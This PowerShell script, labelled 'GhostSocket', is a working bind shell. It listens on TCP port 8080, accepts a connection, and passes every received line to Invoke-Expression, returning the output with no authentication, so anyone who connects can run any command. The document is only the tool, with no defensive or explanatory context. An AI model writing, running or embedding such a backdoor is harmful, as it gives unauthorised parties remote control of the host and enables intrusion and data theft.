$listener = [System.Net.Sockets.TcpListener]8080
$listener.Start()
Write-Host "[🧲] GhostSocket online @ port 8080"

$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object IO.StreamReader $stream
$writer = New-Object IO.StreamWriter $stream
$writer.AutoFlush = $true

while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") { break }
    try {
        $output = Invoke-Expression $command 2>&1
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("[x] Error: $_")
    }
}
$stream.Close(); $client.Close(); $listener.Stop()
